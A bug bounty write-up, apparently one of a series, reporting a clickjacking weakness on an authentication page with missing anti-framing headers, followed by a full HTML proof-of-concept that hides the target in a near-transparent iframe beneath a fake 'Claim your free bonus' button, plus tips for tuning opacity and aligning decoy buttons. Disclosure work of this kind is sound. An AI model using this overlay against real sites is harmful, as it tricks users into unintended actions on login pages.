## 6th Report
* When I am testing rate limiting I noticed headers on authentication page and clickjacking headers are missing
* I created a fake page the code I used I pasted in the end of this page
* And the only authentication page renders perfeclty in frame no main page or any other page means this page is vulnerable to clickjacking
* I verified this many times by changing code and all possible way I know
* Then I reported this

This is my report

![Title](/Bancoplata/assets/6-1.png)
![Report](/Bancoplata/assets/6-2.png)
![Report-2](/Bancoplata/assets/6-3.png)

But this report also got duplicated but no need to worry of duplicate its just a sign of success

![Result](/Bancoplata/assets/6-4.png)

## Source Code I used to verify clickjacking

```python
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Exploit PoC</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        
        .fake-container {
            position: absolute;
            top: 100px;
            left: 150px;
            z-index: 1; 
        }
        .fake-button {
            background-color: #ff4757;
            color: white;
            padding: 15px 30px;
            font-size: 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        
       
        .iframe-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 1000px;
            height: 700px;
            opacity: 0.4; 
            z-index: 2; 
        }
    </style>
</head>
<body>

    <div class="fake-container">
        <h2>Click below to claim your Free Bonus!</h2>
        <button class="fake-button">CLAIM NOW</button>
    </div>

    <div class="iframe-container">
        <iframe src="<URL>" scrolling="no"></iframe>
    </div>

</body>
</html>
```

## Note
* Don't forgot to set opacity of real page to 0.001
* You can create multiple fake buttons just copying the button code and place it on exact location according to browser
* Change placeholder to your vulnerable URL
